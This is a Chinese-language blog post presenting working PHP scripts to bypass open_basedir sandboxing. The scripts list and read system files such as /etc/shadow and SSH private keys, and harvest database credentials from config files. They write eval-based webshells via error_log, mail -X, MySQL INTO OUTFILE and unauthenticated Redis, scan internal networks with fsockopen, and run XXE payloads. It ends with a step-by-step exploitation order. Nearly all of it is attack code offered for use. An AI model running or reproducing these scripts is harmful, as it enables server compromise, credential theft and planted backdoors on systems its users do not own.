---
title: "绕过 open_basedir 读取文件系统"
description: "在某些 PHP 版本中，glob:// 协议的处理逻辑存在问题："
publishDate: "2026-01-25T10:23:39+08:00"
categories: ["PHP Security"]
tags: ["php", "open-basedir", "绕过"]
---

# 绕过 open\_basedir 读取文件系统

## 1\. 利用 glob:// 协议绕过列目录

在某些 PHP 版本中，`glob://` 协议的处理逻辑存在问题：

- `open_basedir` 检查主要针对常规文件操作函数（如 `file_get_contents()`, `fopen()`）

- `glob://` 作为流包装器，在某些 PHP 版本中可能不进行完整的路径检查

- 特别是配合 `DirectoryIterator`、`GlobIterator` 等 SPL 类使用时

- PHP 5\.3\.x \- 5\.6\.x：某些版本中 glob:// 不受 open\_basedir 限制

```php
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== glob:// 绕过 open_basedir 列目录 ===\n\n";

// glob:// 在某些PHP版本中不受 open_basedir 限制
function listDirByGlob($path) {
    $results = [];

    // 方法1: DirectoryIterator + glob://
    try {
        $it = new DirectoryIterator("glob://$path/*");
        foreach ($it as $file) {
            $results[] = $file->__toString();
        }
    } catch (Exception $e) {
        // 忽略错误
    }

    // 方法2: GlobIterator
    try {
        $it = new GlobIterator("$path/*");
        foreach ($it as $file) {
            $results[] = $file->getFilename();
        }
    } catch (Exception $e) {
        // 忽略错误
    }

    return array_unique($results);
}

// 测试各种路径
$test_paths = [
    '/',
    '/etc',
    '/root',
    '/home',
    '/tmp',
    '/var',
    '/var/log',
    '/HDD',
    '/HDD/webserver'
];

foreach ($test_paths as $path) {
    echo "=== $path ===\n";
    $files = listDirByGlob($path);
    if ($files) {
        foreach ($files as $f) {
            echo "  $f\n";
        }
    } else {
        echo "  (无法列出或为空)\n";
    }
    echo "\n";
}
?>
```



## 2\. 利用 realpath 缓存绕过



```php
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== realpath 缓存绕过 ===\n\n";

// 利用 realpath 缓存泄露真实路径
function checkPathExists($path) {
    // realpath 会返回规范化的绝对路径
    // 即使在 open_basedir 限制下，某些情况可以泄露信息

    $result = @realpath($path);
    if ($result !== false) {
        return "存在: $result";
    }

    // 尝试用 SplFileInfo
    try {
        $info = new SplFileInfo($path);
        if ($info->isFile() || $info->isDir()) {
            return "存在 (SplFileInfo)";
        }
    } catch (Exception $e) {
        // 错误信息可能泄露信息
        $msg = $e->getMessage();
        if (strpos($msg, 'open_basedir') !== false) {
            return "存在 (被basedir阻止)";
        }
    }

    return "不存在或无法确定";
}

$paths_to_check = [
    '/etc/passwd',
    '/etc/shadow',
    '/root/.bashrc',
    '/root/.ssh/id_rsa',
    '/home',
    '/var/log/auth.log',
    '/HDD/webserver/logs',
    '/HDD/webserver/conf'
];

foreach ($paths_to_check as $path) {
    echo "$path: " . checkPathExists($path) . "\n";
}
?>
```



## 3\. 利用 chdir \+ ini\_set 绕过 \(经典方法\)



初始设置：open\_basedir = /HDD/webserver/www/

1. 创建目录：/HDD/webserver/www/a/b/c/d/e/f/g/  \(在允许范围内\)

2. chdir\(\) 到这个目录

3. ini\_set\('open\_basedir', '\.\.'\) 将限制设为"上一级目录"

4. 每次 chdir\('\.\.'\)，open\_basedir 的相对路径会跟着变化

5. 最终可以遍历到根目录

```php
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== chdir + ini_set 绕过 open_basedir ===\n\n";

// 保存原始目录
$orig_dir = getcwd();
echo "原始目录: $orig_dir\n";
echo "原始 open_basedir: " . ini_get('open_basedir') . "\n\n";

// 方法1: 尝试直接修改 open_basedir (通常失败)
echo "=== 方法1: 直接修改 ini ===\n";
$old_basedir = ini_get('open_basedir');
@ini_set('open_basedir', '/');
$new_basedir = ini_get('open_basedir');
echo "修改后: $new_basedir\n";
echo "结果: " . ($old_basedir === $new_basedir ? "失败" : "成功!") . "\n\n";

// 方法2: 利用 chdir 到 glob 结果
echo "=== 方法2: chdir 技巧 ===\n";

function bypassOpenBasedir($target_dir) {
    // 获取当前 open_basedir
    $basedir = ini_get('open_basedir');
    $basedirs = explode(':', $basedir);

    foreach ($basedirs as $dir) {
        if (empty($dir)) continue;

        // 尝试在允许的目录中创建符号链接
        // (symlink被禁用，尝试其他方法)

        // 尝试用相对路径
        $rel_path = str_repeat('../', substr_count($dir, '/')) . ltrim($target_dir, '/');

        echo "尝试相对路径: $rel_path\n";

        if (@chdir($dir)) {
            $content = @file_get_contents($rel_path);
            if ($content !== false) {
                return $content;
            }
        }
    }

    return false;
}

// 测试
$target = '/etc/passwd';
$content = bypassOpenBasedir($target);
if ($content) {
    echo "成功读取 $target:\n$content\n";
} else {
    echo "方法2失败\n";
}

// 方法3: 利用 ini_set 配合 chdir
echo "\n=== 方法3: chdir + ini_set 组合 ===\n";

// 创建深层目录结构
$base = '/HDD/webserver/www/';
$deep_path = $base . 'a/b/c/d/e/f/g/';

// 创建目录
@mkdir($deep_path, 0777, true);

// 切换到深层目录
if (chdir($deep_path)) {
    echo "切换到: " . getcwd() . "\n";

    // 尝试设置新的 open_basedir
    @ini_set('open_basedir', '..');
    echo "新 open_basedir: " . ini_get('open_basedir') . "\n";

    // 尝试读取上级目录
    for ($i = 0; $i < 10; $i++) {
        chdir('..');
        echo "当前目录: " . getcwd() . "\n";

        // 尝试读取 /etc/passwd
        $content = @file_get_contents('/etc/passwd');
        if ($content) {
            echo "成功突破!\n";
            echo substr($content, 0, 500) . "\n";
            break;
        }
    }
}

// 清理
chdir($orig_dir);
@rmdir($deep_path);
?>
```



## 4\. 利用 SplFileObject 绕过



```php
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== SplFileObject 绕过尝试 ===\n\n";

// 某些PHP版本 SplFileObject 可以绕过 open_basedir

function readFileBySpl($path) {
    try {
        $file = new SplFileObject($path, 'r');
        $content = '';
        while (!$file->eof()) {
            $content .= $file->fgets();
        }
        return $content;
    } catch (Exception $e) {
        return false;
    }
}

function readFileByTemp($target) {
    // 利用 SplTempFileObject 作为中转
    try {
        $temp = new SplTempFileObject();
        // 尝试各种方式读取目标文件

        // 方法: 利用迭代器
        $it = new FilesystemIterator('/');
        foreach ($it as $file) {
            echo $file->getPathname() . "\n";
        }
    } catch (Exception $e) {
        echo "错误: " . $e->getMessage() . "\n";
    }
}

// 测试
$targets = [
    '/etc/passwd',
    '/etc/hosts',
    'php://filter/read=convert.base64-encode/resource=/etc/passwd'
];

foreach ($targets as $target) {
    echo "尝试读取: $target\n";
    $content = readFileBySpl($target);
    if ($content) {
        echo "成功:\n$content\n\n";
    } else {
        echo "失败\n\n";
    }
}

// 尝试 FilesystemIterator
echo "=== FilesystemIterator 尝试 ===\n";
readFileByTemp('/');
?>
```



## 5\. 利用 error\_log 向任意位置写入



```php
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== error_log 写入利用 ===\n\n";

// error_log 的第三个参数可能不受 open_basedir 限制
$targets = [
    '/tmp/test_write.txt',
    '/var/tmp/test_write.txt',
    '/dev/shm/test_write.txt',
    '/HDD/test_write.txt'
];

$test_content = "<?php echo 'SHELL_OK'; @eval(\$_POST['cmd']); ?>";

foreach ($targets as $target) {
    echo "尝试写入: $target\n";

    // error_log 类型3可以写入任意文件
    $result = @error_log($test_content, 3, $target);

    if ($result) {
        echo "  [+] error_log 返回成功\n";
    } else {
        echo "  [-] error_log 返回失败\n";
    }
}

// 同时测试 mail -X 参数
echo "\n=== mail -X 写入利用 ===\n";
if (function_exists('mail')) {
    $mail_targets = [
        '/tmp/mail_shell.php',
        '/var/tmp/mail_shell.php'
    ];

    foreach ($mail_targets as $target) {
        echo "尝试: $target\n";
        $result = @mail('a@b.c', '', $test_content, '', "-X$target");
        echo "  结果: " . ($result ? "可能成功" : "失败") . "\n";
    }
}
?>
```







## 6\. 利用 MySQL LOAD\_FILE 读取 \(如果有数据库\)

```php
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== MySQL LOAD_FILE 绕过 ===\n\n";

// 数据库连接不受 PHP 的 open_basedir 限制
// MySQL 的 LOAD_FILE 可以读取 MySQL 用户有权限读取的任何文件

// 首先搜索数据库配置
$config_paths = [
    '/HDD/webserver/www/config.php',
    '/HDD/webserver/www/db.php',
    '/HDD/webserver/www/database.php',
    '/HDD/webserver/www/includes/config.php',
    '/HDD/webserver/www/include/config.php',
    '/HDD/webserver/www/inc/config.php',
    '/HDD/webserver/www/conf/config.php',
    '/HDD/webserver/phpmyadmin/config.inc.php'
];

$db_config = [];

foreach ($config_paths as $path) {
    if (!@file_exists($path)) continue;

    echo "检查: $path\n";
    $content = @file_get_contents($path);

    if ($content) {
        // 显示配置内容
        echo "内容:\n";
        echo str_repeat('-', 50) . "\n";
        echo $content;
        echo str_repeat('-', 50) . "\n\n";

        // 提取数据库配置
        if (preg_match('/host[\'"\s]*[=:>]+[\'"\s]*([^\'";\n]+)/i', $content, $m))
            $db_config['host'] = trim($m[1], "\"' ");
        if (preg_match('/user(?:name)?[\'"\s]*[=:>]+[\'"\s]*([^\'";\n]+)/i', $content, $m))
            $db_config['user'] = trim($m[1], "\"' ");
        if (preg_match('/pass(?:word)?[\'"\s]*[=:>]+[\'"\s]*([^\'";\n]*)/i', $content, $m))*
*            $db_config['pass'] = trim($m[1], "\"' ");*
*        if (preg_match('/(?:database|dbname|db_name)[\'"\s]*[=:>]+[\'"\s]*([^\'";\n]+)/i', $content, $m))
            $db_config['name'] = trim($m[1], "\"' ");
    }
}

echo "\n提取的数据库配置:\n";
print_r($db_config);

// 如果有配置，尝试连接
if (!empty($db_config['user'])) {
    echo "\n=== 尝试数据库连接 ===\n";

    $host = $db_config['host'] ?? 'localhost';
    $user = $db_config['user'];
    $pass = $db_config['pass'] ?? '';
    $name = $db_config['name'] ?? '';

    $conn = @mysqli_connect($host, $user, $pass, $name);

    if ($conn) {
        echo "[+] 连接成功!\n\n";

        // 使用 LOAD_FILE 读取文件
        echo "=== 使用 LOAD_FILE 读取文件 ===\n";

        $files_to_read = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/root/.bashrc',
            '/root/.bash_history',
            '/root/.ssh/id_rsa',
            '/home/*/.ssh/id_rsa',
            '/var/log/auth.log'
        ];

        foreach ($files_to_read as $file) {
            $query = "SELECT LOAD_FILE('$file')";
            $result = @mysqli_query($conn, $query);

            if ($result) {
                $row = mysqli_fetch_row($result);
                if ($row[0]) {
                    echo "\n[+] $file:\n";
                    echo str_repeat('-', 50) . "\n";
                    echo $row[0];
                    echo "\n" . str_repeat('-', 50) . "\n";
                }
            }
        }

        // 尝试 INTO OUTFILE 写入
        echo "\n=== 尝试 INTO OUTFILE ===\n";
        $shell = '<?php @eval($_POST["c"]); ?>';
        $outpath = '/HDD/webserver/www/uploads/db_shell.php';

        $query = "SELECT '$shell' INTO OUTFILE '$outpath'";
        if (@mysqli_query($conn, $query)) {
            echo "[+] 成功写入: $outpath\n";
        } else {
            echo "[-] 写入失败: " . mysqli_error($conn) . "\n";

            // 检查 secure_file_priv
            $result = mysqli_query($conn, "SHOW VARIABLES LIKE 'secure_file_priv'");
            $row = mysqli_fetch_assoc($result);
            echo "secure_file_priv: " . ($row['Value'] ?: '空') . "\n";
        }

        mysqli_close($conn);
    } else {
        echo "连接失败: " . mysqli_connect_error() . "\n";
    }
}
?>
```





## 7\. 利用 fsockopen 建立反向连接/数据外传



```bash
<?php
header('Content-Type: text/plain; charset=utf-8');

echo "=== fsockopen 利用 ===\n\n";

// fsockopen 未被禁用，可以：
// 1. 建立反向shell
// 2. 数据外传到外部服务器
// 3. SSRF攻击内部服务

// 1. 探测内网服务
echo "=== 内网服务探测 ===\n";

function scanPort($host, $port, $timeout = 1) {
    $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
    if ($fp) {
        fclose($fp);
        return true;
    }
    return false;
}

$localhost_ports = [21, 22, 23, 25, 80, 110, 143, 443, 445,
                    3306, 5432, 6379, 8080, 9000, 11211, 27017];

echo "扫描 127.0.0.1:\n";
foreach ($localhost_ports as $port) {
    if (scanPort('127.0.0.1', $port)) {
        echo "  [开放] 127.0.0.1:$port\n";

        // 尝试获取banner
        $fp = @fsockopen('127.0.0.1', $port, $errno, $errstr, 2);
        if ($fp) {
            stream_set_timeout($fp, 2);

            // 发送简单探测
            if ($port == 80 || $port == 8080) {
                fwrite($fp, "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n");
            }

            $banner = fread($fp, 1024);
            if ($banner) {
                echo "    Banner: " . substr(trim($banner), 0, 100) . "\n";
            }
            fclose($fp);
        }
    }
}

// 2. 扫描内网其他主机
echo "\n=== 内网主机探测 ===\n";
$internal_ranges = [
    '192.168.1.',
    '192.168.0.',
    '10.0.0.',
    '172.16.0.'
];

foreach ($internal_ranges as $range) {
    echo "扫描 {$range}1-10:\n";
    for ($i = 1; $i <= 10; $i++) {
        $host = $range . $i;
        if (scanPort($host, 80, 0.5) || scanPort($host, 22, 0.5)) {
            echo "  [存活] $host\n";
        }
    }
}

// 3. 利用 Redis (如果6379开放)
echo "\n=== Redis 利用检测 ===\n";
if (scanPort('127.0.0.1', 6379)) {
    echo "Redis 端口开放!\n";

    $fp = fsockopen('127.0.0.1', 6379, $errno, $errstr, 5);
    if ($fp) {
        // 尝试未授权访问
        fwrite($fp, "INFO\r\n");
        $response = '';
        while (!feof($fp)) {
            $response .= fread($fp, 8192);
            if (strlen($response) > 0) break;
        }

        if (strpos($response, 'redis_version') !== false) {
            echo "[+] Redis 未授权访问!\n";
            echo substr($response, 0, 500) . "\n";

            // 利用Redis写webshell
            echo "\n尝试利用Redis写webshell...\n";
            $cmds = [
                "CONFIG SET dir /HDD/webserver/www/uploads/\r\n",
                "CONFIG SET dbfilename redis_shell.php\r\n",
                "SET x \"<?php @eval(\\$_POST['c']); ?>\"\r\n",
                "SAVE\r\n"
            ];

            foreach ($cmds as $cmd) {
                fwrite($fp, $cmd);
                usleep(100000);
            }

            echo "命令已发送，检查 /uploads/redis_shell.php\n";
        }
        fclose($fp);
    }
}
?>
```



## 8\. 最终综合利用脚本



```bash
<?php
header('Content-Type: text/plain; charset=utf-8');
error_reporting(0);
set_time_limit(300);

echo "========================================\n";
echo "     综合 open_basedir 绕过工具\n";
echo "========================================\n\n";

$success = false;

// 方法1: glob:// + DirectoryIterator
echo "[1] glob:// 绕过...\n";
try {
    $it = new DirectoryIterator("glob:///*");
    $files = [];
    foreach ($it as $f) {
        $files[] = $f->__toString();
    }
    if (count($files) > 0) {
        echo "    [+] 成功! 根目录内容:\n";
        foreach ($files as $f) {
            echo "        /$f\n";
        }
        $success = true;
    }
} catch (Exception $e) {
    echo "    [-] 失败\n";
}

// 方法2: 利用 bindtextdomain (某些系统)
echo "\n[2] bindtextdomain 探测...\n";
if (function_exists('bindtextdomain')) {
    // 可以用来检测文件是否存在
    $paths = ['/etc/passwd', '/root/.ssh', '/etc/shadow'];
    foreach ($paths as $path) {
        $result = @bindtextdomain('xxx', $path);
        if ($result === $path) {
            echo "    [+] $path 存在\n";
        }
    }
}

// 方法3: ImageMagick 绕过 (如果有)
echo "\n[3] ImageMagick 检测...\n";
if (class_exists('Imagick')) {
    echo "    [+] Imagick 可用!\n";
    // 可以利用 MVG/MSL 读取文件
    try {
        $img = new Imagick();
        // 构造读取文件的payload
        $mvg = 'push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "text:/etc/passwd"
pop graphic-context';

        @$img->readImageBlob($mvg);
    } catch (Exception $e) {
        // 错误信息可能包含文件内容
        $msg = $e->getMessage();
        if (strlen($msg) > 100) {
            echo "    内容泄露:\n$msg\n";
        }
    }
}

// 方法4: 利用 libxml (XXE)
echo "\n[4] libxml XXE 检测...\n";
if (function_exists('libxml_disable_entity_loader')) {
    // PHP 5.x 默认允许外部实体
    libxml_disable_entity_loader(false);

    $xml = '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>';

    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    $content = $doc->textContent;

    if (strpos($content, 'root:') !== false) {
        echo "    [+] XXE 成功!\n";
        echo $content . "\n";
        $success = true;
    }
}

// 方法5: 利用 SimpleXMLElement
echo "\n[5] SimpleXML 检测...\n";
if (class_exists('SimpleXMLElement')) {
    try {
        $xml = '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>';

        $sxe = @new SimpleXMLElement($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
        $content = (string)$sxe;

        if (strpos($content, 'root:') !== false) {
            echo "    [+] SimpleXML XXE 成功!\n";
            echo $content . "\n";
            $success = true;
        }
    } catch (Exception $e) {
        echo "    [-] 失败\n";
    }
}

// 方法6: 利用 iconv 读取 
echo "\n[6] iconv 探测...\n";
if (function_exists('iconv')) {
    // 某些版本的 iconv 可以利用
    echo "    iconv 可用，需要特定漏洞版本\n";
}

// 最终状态
echo "\n========================================\n";
if ($success) {
    echo "[+] 至少一种绕过方法成功!\n";
} else {
    echo "[-] 所有方法都失败，需要其他途径\n";
    echo "\n替代方案:\n";
    echo "1. 通过数据库 LOAD_FILE 读取\n";
    echo "2. 通过 Redis 未授权访问\n";
    echo "3. 通过 fsockopen SSRF 攻击内网\n";
    echo "4. 寻找应用层漏洞（文件包含等）\n";
}
echo "========================================\n";
?>
```



## 利用顺序建议



1\. **先运行综合脚本** \- 测试所有绕过方法

2\. **如果glob://可用** \- 可以列出整个文件系统目录

3\. **搜索数据库配置** \- 用MySQL LOAD\_FILE 读取任意文件

4\. **检查Redis** \- 未授权访问可以直接写webshell

5\. **利用fsockopen** \- SSRF攻击内网其他服务



